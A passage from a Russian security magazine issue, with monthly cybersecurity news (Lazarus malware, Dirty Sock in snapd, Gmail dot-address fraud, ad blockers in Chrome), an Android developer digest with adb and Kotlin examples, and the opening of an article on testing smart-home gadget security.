   загружает файл CAB с сервера зло умышленни ков, извлекает из него файл
  EXE и выполняет его. Иногда зло умышленники про пускают второй этап дан‐
  ной схемы и не используют Dropbox, сра зу переходя к загрузке малвари
  на машину жертвы.





  Связать происходящее с Lazarus помог финальный пейлоад данной кам‐
  пании — это обновлен ная версия извес тного инстру мента северокорейских
  хакеров KEYMARBLE, и об опас ности этого бэкдора US‐CERT пре дупреждал
  еще летом прошлого года. Малварь проника ет на машину под видом файла
  JPEG (на самом деле это не картинка, а еще один CAB).
    По информации специалистов US‐CERT, KEYMARBLE представляет собой
  мал варь удаленного доступа, использует кастомизированный XOR и при‐
  меняется злоумышленниками для получения информации о зараженной сис‐
   теме, загрузки допол нительных файлов, исполнения различных команд, вне‐
  сения изменений в реестр, захвата снимков экра на и извлечения данных.


  SAFARI ОТКАЗЫВАЕТСЯ ОТ DO NOT TRACK
   Разработчики Safari решили отказаться от использования функциональнос ти Do Not Track (DNT)
   в своем браузере, так как она (очень иронично) может применяться для скрытой слежки
   за пользователями. В ответ на это разработчики поис ковика DuckDuckGo напомнили, что толь‐
   ко 24,4% пользователей в США вообще вклю чают DNT, а большинство круп ных компаний
   (Google, Facebook, Twitter и многие другие) игнорируют нас тройку Do Not Track вовсе.





   →«Весьма тревожно осоз навать, что Do Not Track защищает [от слежки] примерно так же,
   как стоящий перед домом знак „пожалуйста, не заг лядывайте в мой дом“, тогда как все шторы
   на окнах открыты»
  — разработчики DuckDuckGo констатируют факты





                                        Продолжение статьи →
← Начало статьи





 БЛОКИРОВЩИКИ
 В CHROME
 НЕ СЛОМАЮТСЯ
  В конце января мы расска зывали о серь езной проб леме, которая обеспоко‐
  ила разработчиков расширений для бло кировки контента в браузерах. Дело
   в том, что в настоящее время инженеры Google готовят третью версию
  манифеста, который определяет воз можнос ти и ограничения для рас‐
  ширений.
    Напомню, что в Google планировали ограничить работу webRequest API,
  а это могло негатив но ска заться на функционирова нии блокировщиков кон‐
   тента и других расширений. Вместо webRequest раз работчикам будет пред‐
  ложено использовать declarativeNetRequest. Разумеется, в Google считают,
   что эти улучшения повысят безопасность и производительность.
    Первым внимание к этой проблеме привлек разработчик популярных бло‐
  кировщиков uBlock Origin и uMatrix Реймонд Хилл (Raymond Hill). Он предуп‐
   редил, что отказ от webRequest ста нет «смертью» для его продуктов, а также
  выразил опасение, что переход на API declarativeNetRequest может пагубно
   сказаться на множестве дру гих решений. В итоге точку зрения раз работчика
  поддержали мно жество его «коллег по цеху», включая создателей NoScript,
  tampermonkey и защитных решений.
     Теперь команда — раз работчик Ghostery опубликовала инте ресное иссле‐
  дование, в котором наглядно продемонс трирова ла, что работа блокиров‐
  щиков рекламы практичес ки не ска зывается на производительности Chrome,
   хотя разработчики Google утверждали обратное в комментариях к третьей
  версии манифеста.
    Иссле дователи продемонстрировали бенчмарк‐тесты uBlock Origin, Ad‐
   block Plus, Brave, DuckDuckGo и Ghostery, которые доказы вают, что блокиров‐
  щики практически не влияют на скорость заг рузки страниц. Порой страницы
  без рекламы грузятся даже быс трее, чем с рекламой.
     Вскоре после публикации этого доклада инженеры Google поспешили
  прокомментировать ситу ацию. По их словам, никто не собирался полностью
   отказываться от webRequest API и команда Chrome вовсе не пытается
  усложнить жизнь разработ чикам рас ширений и тем более не пытается вывес‐
   ти из строя сторонние бло кировщики контента.
     Стоит отметить, что инженеры Google сами инициировали публичное
  обсуждение текущей редакции манифеста, перед тем как окончательно при‐
   нять его и внести важные изменения в код. Хочется верить, что в Google дей‐
   ствительно прислушаются к мнению сооб щества и специалистов и третья
  версия манифеста будет основательно отредактирована.


 В РОССИИ УЯЗ ВИМЫ 44% УМНЫХ ДОМОВ

   Специалисты Avast под считали, что почти половина умных домов уязвима перед раз личны ми
   атаками. Проанализировав 16 000 000 домаш них сетей, исследователи выяснили, что
  44,07% умных домов имеют хотя бы одно уязвимое устройство, компрометация которого
   может угрожать безопасности всей домашней сети.

   Большинство домашних устройств (68,9%) в России используют тривиальные пароли и пре‐
   небрегают двухфакторной аутентификацией. Кроме  того, на 33,6% устройств в России
   не установлены последние обновления безопас ности.

   Наиболее уязвимыми для атак оказались: принтеры — 32,9%, сетевые устройства — 28,9%,
   камеры видеонаблюдения — 20,8%, сетевые хранилища данных (NAS) — 7,8%, медиапле‐
   еры — 5,3%.

  В России картина выглядит нем ного иначе. Здесь самыми уязвимыми устройствами стали
   телевизоры — 46,4%, принтеры — 15,4%, камеры виде онаблюдения — 11,2%, медиапле еры —
  8,9%, планшеты — 8,3%.





 ТОЧКИ В GMAIL
  Специалисты компании Agari обра тили внимание на инте ресную проблему:
  мошенники по‐прежнему злоупотребляют легитимной функциональностью
   Gmail, прирав нивающей адреса с точками друг к дру гу. С помощью этой схе‐
  мы преступники получа ют пособия по без работице, занимаются махина‐
  циями с налогами и обходят пробные пери оды онлайновых сервисов.
    Проблема заключается в том, что Gmail по‐прежнему игнорирует точки
   в адресах, то есть поч товый сервис считает, что johnsmith@gmail.com, john.‐
  smith@gmail.com или jo.hn.sm.ith@gmail.com — это один и тот же ящик.
  И мошенники давно поняли, что эту осо бенность сервиса можно исполь‐
   зовать не так, как было задумано. Один из недавних примеров — вредонос‐
  ная кампания, направленная против пользователей Netﬂix. Скамеры обманом
  вынуждали жертв привязывать банковские карты к своим аккаунтам, по сути
  зарегистрированным на адреса этих пользователей, только с использовани‐
  ем точек.
    Дело в том, что большинс тво сайтов, включая государственные порталы,
   Netﬂix, Amazon, eBay и так далее, считают адреса с точками разными, то есть
   в их понимании johnsmith@gmail.com и john.smith@gmail.com — это не одно
  и то же. И именно здесь начинаются проб лемы.
    По данным Agari, в прош лом году мошенники эксплу атировали проблему
  адресов с точками даже активнее, чем до этого. Специалисты пишут, что
  отслеживают активность нес кольких хакерских групп, практику ющих такой
  подход. К примеру, толь ко одна хак‐группа исполь зовала 56 вариантов одно‐
   го и того же адреса Gmail для следующих операций:
   • подача 48 заявлений на выдачу кредитной карты в четырех американских
     банках (в результате преступники нелегально получи ли около 65 тысяч
     долларов в кредит);
   • регистрация 14 проб ных акка унтов в сервисах коммерческих продаж (с
     целью сбора данных для дальнейших BEC‐атак);
   • подача 13 фальшивых налоговых деклараций через онлайновые сервисы;
   • заполнение 12 заявок на смену адреса в Почтовой службе США;
   • подача 11 фальшивых заявлений на получение социальных пособий;
   • подача заявок на получение пособий по безработице в разных штатах
     от лица девяти разных «личностей»;
   • подача заявок на получение помощи, ока зываемой населению при сти хий‐
     ных бедствиях, от лица трех разных «личностей».

  Исследователи отмечают, что такой подход позволяет прес тупни кам при‐
  вязывать различную нелегальную активность к одному адресу Gmail, что
  «повышает эффективность их операций».
     Стоит сказать, что точки в адресах не единс твенная функция Gmail,
  которая может представлять опасность для пользователей. Дело в том, что
  почтовый сервис похожим образом относится и к знаку плюса: адрес вида
  username+случайноеслово@gmail.com будет при равнен к username@gmail.‐
  com. Кроме того, по‐прежнему работа ет легаси‐домен @googlemail.com, то
   есть все письма, направленные на адрес username@googlemail.com, придут
  на username@gmail.com. К счастью, пока мошенники не используют эти воз‐
  можности Gmail для скама и фрода, одна ко ИБ‐эксперты отме чают, что эти
  особенности сервиса могли бы еще рас ширить арсенал преступников и соз‐
   дать не меньше проб лем, чем адреса с точками.


 БЫСТРЫЕ РОССИЙСКИЕ ХАКЕРЫ

   Аналитики CrowdStrike подготовили отчет об угрозах 2019 года и подсчи тали, что во время
   кибератак  у компаний и организаций  есть примерно 20 минут,  что бы  отреаги ровать
   и защититься, если те имеют дело с российски ми правительствен ными хакерами. Такие
   выводы исследователи дела ют на основании под считанного «времени про рыва» (breakout time).
   Этим термином в CrowdStrike называют отре зок времени, ког да хакеры уже получили пер‐
   вичный доступ к системам компании‐жертвы, но еще не развили свою атаку и не начали прод‐
   вигаться дальше. В это время атакующие сканируют локальную сеть, применяют экспло иты
   для повышения при вилегий и распространяют компрометацию на дру гие устрой ства.


   Специалисты присвоили правительствен ным хакерам разных стран забавные иден тификаторы.
   Так, российские хакеры в классификации CrowdStrike — это медведь, китай ские хакеры — пан‐
   да, мифический крылатый корейский конь Чхоллима — Северная Корея, котенок — Иран, паук —
   обычные хакеры, ищущие финансовой выгоды, а хактивисты всех мастей — шакалы.





   Оказалось, что российские APT — самые быстрые среди «коллег по цеху», у них продвижение
   атаки занимает всего 18 минут 49 секунд. На втором месте северо корейские хакеры
   с 2 часами и 20 минута ми, на третьем китайские злоумышленники — 4 часа ровно.

   Среднее «время прорыва» в 2018 году составляло 4 часа 37 минут, то есть значительно уве‐
   личилось по сравнению с 2017 годом, когда эта величина равнялась 1 часу 58 минутам.

  Китайские и северокорейские хакеры оказались ответс твенны почти за 50% всех пра‐
   вительственных атак в 2018 году.

  Россия и Иран в основном атакуют телеком муникационные ком пании.

   Хакерские группы все чаще арендуют раз личные инструменты и сервисы у дру гих груп‐
   пировок вместо того, чтобы соз давать собственные.





 DIRTY SOCK
  ИБ‐эксперт Крис Моберли  (Chris  Moberly) из австралийской компании
  The Missing Link обнаружил опас ную уяз вимость в snapd, которая получи ла
  имя Dirty Sock и идентификатор CVE‐2019‐7304. На GitHub уже были опуб‐
  ликованы proof‐of‐concept экспло иты для этой проб лемы, которая затрагива‐
   ет Ubuntu и другие дистрибутивы.
       Dirty Sock не дает ата кующему уда лен но проникнуть на уяз вимую машину,
  однако позволяет злоумышленнику повысить свои при вилегии в уже заражен‐
  ной системе до root‐доступа, то есть захватить пол ный контроль.
    Иссле дователь объяснил, что экс плуатация проб лемы может варьировать
   от дистрибутива к дистрибутиву. Так, экс плоит dirty_sockv1 создает локаль‐
  ного пользователя с помощью API create‐user, используя данные Ubuntu SSO.
  В свою очередь, эксплоит dirty_sockv2 применя ется для загрузки snap‐
   пакета, содержащего install‐хук для создания нового локального пользовате‐
   ля. Моберли объясняет, что snapd ставит под удар локальный сервер REST
   API, с которым snap‐пакеты вза имо действуют во вре мя установки новых
   snap’ов.  Эксперт  нашел  способ  обойти  установленные  ограничения
  и получить доступ ко всем функциям API, а в итоге и root‐дос туп.
    Специалист предупрежда ет, что баг можно эксплу атировать, напрямую
  выпол нив вре доносный код на зараженной машине или же спрятав экс плоит
   в snap‐пакете. Это довольно тревожная новость, так как в Snap Store ранее
  уже обнаруживали малварь.
    Перед проблемой Dirty Sock уяз вимы все версии snapd от 2.28 до 2.37.
  Разработчики Canonical уже подготовили патч и представили исправленный
  snapd 2.37.1. Так как snapd входит в сос тав не только Ubuntu, но и других дис‐
  трибутивов, обновления дос тупны для Debian, Arch Linux, OpenSUSE, Solus
  и Fedora.



   ИБ‐специалист из Германии Линус Хенце обнаружил уяз вимость нулевого дня в macOS и опуб‐
   ликовал на YouTube proof‐of‐concept видео, демонс трирующее, как можно похитить все пароли
   пользователя из Keychain. Кроме этого видео, Хенце не обнародо вал никаких техничес ких
   деталей бага, не стал выкладывать в открытый дос туп экс плоит, но так же он не сообщил ничего
   и разработчикам Apple. Как исследователь объяснил журналис там издания The Register, он
   отказался делиться данными с ком панией по иде ологичес ким соображениям, ведь у Apple
   до сих пор нет программы Bug Bounty для macOS.





   →«Хотя все выглядит так, будто я делаю это ради денег, в дан ном слу чае у меня сов сем другая
   мотивация. Моя мотивация: подвигнуть Apple к созданию прог раммы Bug Bounty. Думаю, что
   так будет лучше для всех, и для Apple, и для исследователей. Я очень люблю продукты Apple
   и хочу, чтобы они стали безопаснее»
  — Линус Хенце, ИБ‐специалист





 ANDROID‐
 ПРИЛОЖЕНИЯ
 ПОД TOR
  Эксперты Римского универ ситета «Сапиенца» представили доклад, пос‐
  вященный созданному ими алго ритму, способ ному с высокой точностью
  определять, каким именно приложением поль зовался человек, даже если
  речь идет о Tor‐трафике.
     Работа специалистов опирает ся на дру гой научный доклад, где был опи‐
  сан анализ TCP‐пакетов в Tor‐трафике, на основании которого можно опре‐
   делять восемь категорий тра фика: браузинг, email, чаты, аудио‐ или виде‐
  остриминг, передача файлов, VoIP и P2P.
     Итальянские исследователи применили ту же концепцию анализа TCP‐
   пакетов, однако  изучали  паттерны, присущие  известным приложениям
  для Android. Для этого был соз дан специальный алгоритм машинного обу‐
   чения, который тренировали на Tor‐трафике Tor Browser для Android, Insta‐
   gram, Facebook, Skype, uTorrent, Spotify, Twitch, YouTube, Dailymotion и Replaio
   Radio. В итоге спе циалисты научились рас позна вать, какое именно приложе‐
  ние использует человек, с точностью 97,3%.
     Впрочем, если вдавать ся в детали, эти цифры выг лядят уже не столь пуга‐
  юще. Дело в том, что таких результатов алгоритм может добиться лишь в том
   случае, если от устрой ства не исходит никакого фонового трафика вообще.
  То есть пользователь должен работать только с одним приложением. Если
  на  устройстве запущено много приложений,  паттерны TCP меняются,
  и эффективность алго ритма падает.
     Кроме  того, исследователи отмечают большой процент ложнополо‐
  жительных срабатываний от работы похожих сервисов. К примеру, алгоритм
  может перепутать Spotify и YouTube, так как эти приложения име ют схожий
   «рисунок» трафика. Также для рас позна вания Facebook, Instagram и других
  подобных продуктов может потребоваться немало времени, так как в работе
   алгоритма возникают вынужденные «прос тои», во время которых поль‐
  зователь уже доб рался до нуж ного контента и попросту читает.


  3 400 000 ДОЛЛАРОВ ВЫПЛАТИЛА GOOGLE ЗА БАГИ


   Компания Google подели лась интересной статис тикой за 2018 год: эксперты рассказали,
   сколько средств было потрачено на официальную прог рамму Bug Bounty.

   За год компания вып латила суммарно исследователям 3 400 000 долларов США, 1 700 000
   из которых получили специалисты, нашедшие уязвимос ти в Android и Chrome. А в общей слож‐
   ности на выплату воз награждений за баги уже было потрачено более 15 000 000 долларов
  США (с 2010 года).

  В 2018 году награды удостоились 317 авторов из 78 стран мира, суммарно подавшие 1319
   баг‐репортов. Самой крупной единоразовой выплатой за уязвимость стало bounty в размере
   41 000 долларов США. Кроме того, сообщается, что исследователи решили отдать око ло
   141 000 долларов на бла готворительность.



  ДРУГИЕ ИНТЕРЕСНЫЕ СОБЫТИЯ МЕСЯЦА

   Архитектор кибербезопасности в Microsoft рассказал, что Internet Explorer — это не браузер
   в современном понимании этого слова


   Кроссовки Nike Adapt BB с автошнуровкой перес тают работать пос ле обновлений


  В устройствах Google Nest Secure нашли скрытые микрофоны, которых не было в специфи каци‐
   ях


   Треть расширений для Chrome используют в работе уязвимые библиотеки


   Сообщение с фальшивой новостью, как червь, распространилось по «Вконтакте» из‐за бага


   Проблема Thunderclap и периферия Thunderbolt представляют угрозу для Windows, Mac, Linux


  Облачные серверы не всегда достаются клиентам «чис тыми», воз можна подмена прошивки
  BMC


   Россиянин — создатель банкера NeverQuest признал себя виновным


   Около 18 тысяч приложений для Android собирают информацию о пользователях


   Опубликован эксплоит для бага в runC, угрожающего Docker, Kubernetes и не только
HEADER
ANDROID





 МНОГОПОТОЧНОЕ ПРОГРАММИРОВАНИЕ,
      ВНУТРЕННОСТИ APP BUNDLE
     И МГНОВЕННЫЙ ПЕРЕЗАПУСК
          ПРИЛОЖЕНИЙ





Сегодня в выпус ке: отключаем и уда ляем
предустановленный софт без  root,  раз‐
бираемся с фор матом распространения
приложений App Bundle, запускаем коро‐
утины в основном потоке без задержек,          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
разбираемся в многопоточном программи‐              zobnin@glc.ru
ровании, учимся держать код в чистоте
и порядке, изучаем новый механизм hot re‐
load в Android Studio и, конечно же, берем
на вооружение свежие библиотеки.


                ПОЧИТАТЬ


Удаляем/отключаем любые пре дустановленные приложе ния
без root
How to disable any pre‐installed system app bloatware on Android without root —
несколько баянистая, но оттого не менее полезная статья о том, как отклю‐
чить любое предустановленное на устройство приложение, не имея прав root.
  Для начала необ ходимо активировать ADB в настройках разработчика
на устройстве (как это сделать, написа но на каждом углу) и установить ADB
на комп. Затем с помощью любой утилиты для управления приложениями
нужно узнать точное имя пакета это го при ложения. Автор статьи рекомендует
использовать для это го App Inspector.
  Далее открываем терминал на ПК и выполняем такую команду:


$ adb shell pm disable‐user ‐‐user 0 <имя_отключаемого_пакета>

В случае необходимости приложение мож но вклю чить снова:


$ adb shell pm enable <имя_отключенного_пакета>

А с помощью такой команды можно прос мотреть список отключенных при‐
ложений:


$ adb shell pm list packages ‐d

Кроме того, приложение можно полностью уда лить с устройства:


$ adb pm uninstall ‐k ‐‐user 0 <имя_пакета>





                   Список отключенных пакетов


              РАЗРАБОТЧИКУ


Все, что нуж но знать об App Bundle
Android App Bundles: Getting Started — боль шая статья о новом формате рас‐
пространения приложений App Bundle, поз воляющем существенно сократить
размер приложения, которое пользователям придется скачивать и устанав‐
ливать.
  Идея App Bundle достаточно проста. Android‐смартфоны могут быть очень
разными, поэтому разработчикам необ ходимо заботиться о таких вещах,
как разные размеры иконок для раз ных разрешений экрана, переводы
на другие языки и сборки нативных биб лиотек для раз ных архитектур процес‐
соров. В результате пользователям приходится ска чивать громоз дкое при‐
ложение, вклю чающее код и данные, которые на их конкретном телефоне
не нужны.
   Частично эту проб лему можно решить самос тоятельно, разделив при‐
ложение на несколько раз ных версий с помощью директив buildTypes
и splits системы сборки Gradle. Однако в этом случае их все приходится
заливать в Google Play по отдельности, а это может превратиться в кошмар,
если в результате разделения получится десяток раз личных версий.
  App Bundle позволяет упаковать код и данные всех версий в один пакет
с расширением .aab и оста вить его разделение для разных смартфонов
на усмотрение гуглу.
   Также статья содержит другую интересную информацию:
 • App Bundle — это обычный ZIP‐архив. Его можно распаковать любым архи‐
   ватором, поддерживающим формат ZIP.
 • Google не просто соз дает из App Bundle нес колько вариантов APK
   для разных смартфонов. Он дробит их на мелкие час ти, которые могут
   быть скачаны по мере необ ходимости. Нап ример, при смене языка смар‐
   тфон автоматически докача ет и уста новит APK с нужным языковым
   пакетом.
 • Google уже работает над функцией Dynamic delivery, которая позволит
   дробить App Bundle на еще более мел кие час ти, разделяя не только
   ресурсы и нативные биб лиотеки, но и код самого приложе ния. В этом слу‐
   чае сначала поль зователи будут уста навливать только «самую исполь‐
   зуемую» часть приложения, а допол нительные компоненты будут докачи‐
   ваться при необходимости (точно так же работа ют Instant Apps).
 • Расщепить App Bundle на набор APK можно и самос тоятельно. Для этого
   необходимо скачать и установить ути литу BundleTool. Использовать так
   (все APK будут упакова ны в ZIP‐архив app.apks):


$ java ‐jar bundletool.jar build‐apks ‐‐bundle=app.aab
‐‐output=app.apks

Или так, если ты хочешь установить их на смартфон:


$ java ‐jar bundletool.jar build‐apks ‐‐bundle=app.aab
‐‐output=app.apks
‐‐ks=keystore.jks
‐‐ks‐pass=<путь_до_keystore>
‐‐ks‐key‐alias=<key_alias>
‐‐key‐pass=<пароль>

Чтобы сразу установить приложение на смартфон, используй такую команду:


$ java ‐jar bundletool.jar install‐apks ‐‐apks=app.apks





                App Bundle после раз деления на APK


Мгно вен ный запуск коро утин в основном потоке
Launching a Kotlin Coroutine for immediate execution on the Main thread — инте‐
ресное исследование, почему короутины Kotlin не запускаются сразу, если
они используют Disaptcher.Main.
  Представим такой код:


override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    launch(Dispatchers.Main) {
        log("A")
    }
    log("B")
}

Вопреки интуиции, он выведет на экран «B A» вместо «A B». Причина такого
поведения заключается в том, что, хотя оба вызова функции log должны быть
выпол нены в основном потоке приложения, вызов log("A") все равно будет
поставлен в оче редь и, таким образом, будет выполнен уже пос ле log("B").
   Этого можно избе жать, если исполь зовать Dispatchers.Main.immediate
вместо Dispatchers.Main. Но разработчики Kotlin настоятельно не рекомен‐
дуют этого делать, так как в этом случае ты можешь столкнуться с багами,
которые очень трудно поймать.


Не ожидан ная причина использовать устаревший API анимации
One still surprisingly valid reason to use the old Animation (API 1+) — инте ресная
заметка о том, почему устаревший и давно никем не используемый API ани‐
мации из древних версий Android еще может быть полез ным для программис‐
тов.
  С самых первых версий в Android был API ани мации android.view.anima‐
tion. По сравнению с современными ValueAnimator и ObjectAnimator его
возможности были сильно огра ниченны, к тому же он страдал от бага,
который заставлял сис тему думать, что анимиру емый объ ект находится
на своем месте, даже если визу ально он в другом. Например, если сделать
эффект выезда элемента интерфейса из‐за экра на, во время ани мации сис‐
тема будет предполагать, что он уже на своем финальном месте, поэтому
клик по текущему положению элемента ничего не даст, но клик по его ожи‐
даемому положе нию будет обра ботан, как будто он уже там. В новых API баг
был исправлен.
  Однажды у автора статьи возникла проблема. Он хотел, чтобы пользовате‐
ли могли работать с его приложением максимально быс тро и кликать на эле‐
менты интерфейса, не дожида ясь окончания их ани мации. И как раз здесь
возникла проблема с новым API, который правильно рассчитывает текущее
положение элементов интерфейса: клик по тому мес ту, где пользователь
ожидал увидеть элемент интерфейса, прос то не проходил, потому что эле‐
мент еще не «доехал» до него (анимация не закончилась). А вот старый API
с его багом работал в данной ситуации отлично.
  Для примера. Анимация с использовани ем нового API:


appearingGroup.setTranslationY(offset);
appearingGroup.setAlpha(0f);
appearingGroup
    .animate()
    .translationY(0f)
    .alpha(1f)
    .setDuration(100L)
    .setStartDelay(35L)
    .setInterpolator(interpolator)
.start();

С использованием старого API:


AnimationSet animSet = new AnimationSet(true);
animSet.addAnimation(new TranslateAnimation(0f, 0f, offset, 0f));
animSet.addAnimation(new AlphaAnimation(0f, 1f));
animSet.setDuration(100L);
animSet.setStartOffset(35L);
animSet.setInterpolator(interpolator);
appearingGroup.startAnimation(animSet);


Как Android Studio 3.5 уско рит повторный запуск приложе ния
при отладке
Android Studio Project Marble: Apply Changes — статья раз работчиков Android
Studio о функции Apply Changes, которая должна ускорить повторный запуск
приложения в эмуляторе или на реальном устройстве.
   Apply Changes дол жна прийти на смену плохо зарекомендовавшему себя
механизму Intsant Run, который часто работал неверно и был несовместим
со многими типами приложения. Смысл функции остался прежний —
попытаться избе жать перезапус ка приложения при небольших изменениях
кода и ресурсов и таким обра зом уско рить продуктивность тестирования
и отладки. Однако детали реализации изменились:
 • В этот раз разработчики решили сделать упор на стабильность работы
   механизма, даже если для это го приходится жертвовать скоростью.
 • Apply Changes работает только на Android 8 и выше.
 • Если в новой сборке приложения изменились только ресурсы, Android Stu‐
   dio перезапускает только активнос ти приложения.
 • Если изменился код, Android Studio подменяет код новым прямо в памяти
   без перезапуска приложения. Одна ко эта функция работает только в том
   случае, если изменился код методов, но не их сиг натуры.
 • Если были изменены AndroidManifest.xml или нативные библиотеки, An‐
   droid Studio придется перезапус тить приложение.





                  Принцип работы Apply Changes


Раз ница меж ду пулами потоков: CPU-bound vs. I/O-bound
Understanding CPU‐ and I/O‐bound  for asynchronous operations — статья
о многопоточном программировании, пос вященная разнице между потока‐
ми, которые предназначены для выполнения рас четов (CPU‐bound), и потока‐
ми, в которых должны быть выполнены операции ввода‐вывода (I/O‐bound).
  Все мы знаем, что тяжелые расчеты и сетевые операции необходимо
выносить в отдельные потоки. Также все мы зна ем, что создание нового
потока требует много ресурсов. Имен но поэтому современные системы
не заставляют программиста создавать новые потоки на каждый чих, а пред‐
лагают использовать так называемые пулы потоков (thread pool): если нужно
вынести какую‐то работу в отдельный поток, ты достаешь поток из пула
и отдаешь эту работу ему.
   Так работают и RxJava, и Kotlin Coroutines. Они предлагают два вида пулов:
I/O‐bound и CPU‐bound. Что бы понять, в чем их различия, нужно разобраться,
почему те или иные операции необходимо выносить в отдельные потоки.
  Операции ввода‐вывода, такие как сетевые запросы и чте ние больших
файлов, следует выносить в отдельный поток просто потому, что они блокиру‐
ют его: поток отправляет сетевой запрос и до тех пор, пока не получит ответ,
блокируется без возможности делать что‐либо еще. Если выполнить сетевой
запрос в основном потоке приложения, оно просто зависнет до получе ния
ответа.
  Приложения могут отправлять множес тво сетевых запросов во время
работы, поэтому пул I/O‐потоков должен быть большим. Таким большим, что‐
бы в любой момент приложение могло запросить еще один поток и не заб‐
локироваться из‐за того, что они закончились.
  С вычислительными операциями дело обстоит примерно так же. Если
необходимо сделать много вычислений, требующих больших процессорных
ресурсов, лучше исполь зовать отдельный поток — как и в случае с I/O‐опе‐
рациями, во вре мя вычислений поток будет заб локирован.
  Однако есть маленький, но очень важ ный нюанс: если в случае с потоками
ввода‐вывода ожидание ничего не стоит и поэто му мы можем спокойно пло‐
дить их, то в случае с вычислительными потока ми мы упираемся в количество
ядер процессора. Размер пула вычислительных потоков дол жен быть при‐
вязан к количеству процессорных ядер, иначе можно «повесить» приложение.
   Окей, а как быть с приложениями, которые выполняют сначала операции
ввода‐вывода, а затем вычислительные операции? Для этого можно перек‐
лючаться между потоками. Kotlin поз воляет делать это легко и удобно:


launch(Dispatchers.IO) {
    val image = api.fetchImageAsync(url).await()
    withContext(Dispatchers.Default) {
        val blurred = image.blur()
        withContext(Dispatchers.Main) {
            displayImage(blurred)
        }
    }
}

Тот же пример с использованием RxJava:


api.fetchImageObservable(url)
    .subscribeOn(Schedulers.io())
    .observeOn(Schedulers.computation())
    .map { blurImageSync(it) }
    .observeOn(AndroidSchedulers.mainThread())
    .subscribe { displayImage(it) }


Как держать код в чистоте и поряд ке
Five tips to get your code base in shape — нес коль ко советов о том, как под‐
держивать свой код в чистоте и порядке. Кому‐то они покажутся банальными,
но для новичков могут стать откро вением.
 1. Не переписывай  код. В определенный момент тебе в руки может
   попасть устаревшее приложение, построенное на старых технологиях и,
   как тебе кажется, не слишком эффективное. У тебя может возникнуть
   желание переписать большую часть кода, но не стоит спешить. Скорее
   всего, этот код до сих пор отлично работа ет и пользователи в целом
   довольны приложением. Когда ты возьмешь ся его переписывать, работа
   над новыми функциями оста новит ся, ты потратишь уйму времени, чтобы
  фактически переписать приложение с нуля, и в итоге пользователи,
   не подозревающие о внут ренних изменениях, получат то же самое при‐
   ложение. Да, часто нельзя смотреть без слез на чужой код, но, может
   быть, стоит начать с самых ужас ных мест и постепенно избавляться
   от легаси?
 2. Больше релизов. Опять же, имея дело с легаси‐кодом, который слабо
   или совсем не пок рыт тестами, ты будешь часто сталкиваться с проблемой
   «изменил строку кода в одной части приложения — сломал функцию сов‐
  сем в другом месте». Такая проблема может существенно рас тянуть
   релиз‐цикл из‐за необходимос ти постоянного ручного тестирования,
   которое, в свою очередь, может привести к появлению множества веток
   приложения (работа над новыми функциями не должна останавливаться,
   пока приложение про ходит через тестировщиков) и других недос татков.
  Но есть решение: выпус кать релизы час то. Если вмес то одного релиза
   с множеством изменений ты будешь выпус кать множество мел ких релизов
   с одной‐двумя новыми функциями, тес тирова ние приложе ния сущес твен‐
   но упростится и ускорится.
 3. Раз деляй и влас твуй. Самый банальный совет статьи сводится к сле‐
  дующе му: стоит разделить приложение на независимые компоненты,
   которые можно изменять отдельно друг от дру га, не боясь, что изме нение
   в одном месте вызовет проблему в другом. Да, писать спагетти‐код
   с кучей зависимостей между компонентами гораздо проще, но в будущем
   такой код заставит тебя тра тить уйму времени на тестирование и сожрет
  добрую половину нервных клеток.
 4. Изу чи свои инс тру менты. Ты можешь удивить ся, сколько отличных фун‐
   кций для автоматизированного рефакторин га вклю чает в себя Android Stu‐
    dio. Многие из этих функций рассмат риваются в другой статье автора.


              БИБЛИОТЕКИ


 • InternalAppStore — набор библиотек и инс трументов, позволяющий быстро
   развернуть свой собственный магазин при ложений;
 • FlutterExamples — шпаргалка и сборник примеров по Flutter;
 • android‐checkout — обертка, поз воляющая быстро и без хлопот интегри‐
   ровать библиотеку биллинга Google в приложение;
 • AndroidRibbon — View, реализующий переливающуюся ленточку поверх
   изображения;
 • belvedere — диалог выбора изоб ражений;
 • ScratchCardView — реализация скретч‐карты, как в лотерейном билете;
 • BubbleGum — библиотека для применения анимированного градиента
   к любым элементам интерфейса;
 • Thumby — библиотека для интерактивного создания превью из видео;
 • ExpandableHintText — красивая анимированная реализация EditText;
 • Tomo — коллекция эффектов для обработки изоб ражений;
 • StfalconImageViewer — встра иваемый прос мотрщик изображений;
 • TimetableLayout — RecyclerView.LayoutManager для показа данных в виде
   сетки расписания;
 • Boots — библиотека для орга низации слаженного процесса загрузки при‐
   ложения;
 • RoundImageView — круглый ImageView, который под держивает векторные
   изображения.
COVERSTORY
ВСКРЫТЬ
И ИЗУЧИТЬ

 ПОЛНЫЙ ГАЙД
 ПО ПОТРОШЕНИЮ
 ДОМАШНИХ ГАДЖЕТОВ





   Илья Шапошников
      Специалист по
     информационной
безопасности в Positive Tech‐
  nologies, студент МГТУ им.
         Баумана
     drakylar@gmail.com





Представим себе, что в наши цеп кие и очумелые руки попал
какой‐нибудь интересный гаджет. Скажем, контроллер умно‐
го дома или современная интерак тивная телеприставка,
умеющая показывать тысячу каналов из разных уголков
мира, а во время рекламных пауз — варить эспрессо.
Как узнать, что дела ет этот гаджет, пока мы не видим?


Где гарантия, что, подключившись к домашнему Wi‐Fi, приставка вти харя
не собирает пароли от наших любимых сайтов, а умный дом не транслирует
с помощью камер видеонаблюдения стрим прямо из спальни? Чтобы обе‐
зопасить себя от подоб ного вос ста ния машин, нужно тщательно изучить
принцип работы гаджета и защитить его от проникновения любоз нательных
доброжелателей.
  И тут внезапно обнаруживается, что ни на одном русскоязычном ресурсе
нет методологии анализа защищенности умных вещей. Что ж, самое время
это исправить!


ПРО БЕЗОПАСНОСТЬ УМНЫХ УСТРОЙСТВ
В 2018 году много обсуждалась безопас ность интерне та вещей, в том числе
в связи с эпидемиями малвари вроде Mirai и VPNFilter, которая заражает
домашние гаджеты. Что бы защититься от подоб ных неприятностей, нужно
хорошо представлять себе устройство и прин ципы работы умных гад жетов.
А значит, мы должны уметь гра мотно тес тировать такие девайсы.


Читай так же
«Хакер» неоднократно писал об уяз вимос тях умных гаджетов:
 • Смотри во все глаза. Как взламыва ют IP‐ и веб‐камеры и как от этого
   защититься
 • Смеш ные и страш ные вещи. Вспомина ем самые зрелищ ные взломы
   IoT за последние нес колько лет
 • Опасный IoT. Как найти уязвимые устройства и что мешает их взломать
 • По сле дам Mirai. Разбира емся, как трояны поражают IoT, на примере
   самого злого из них



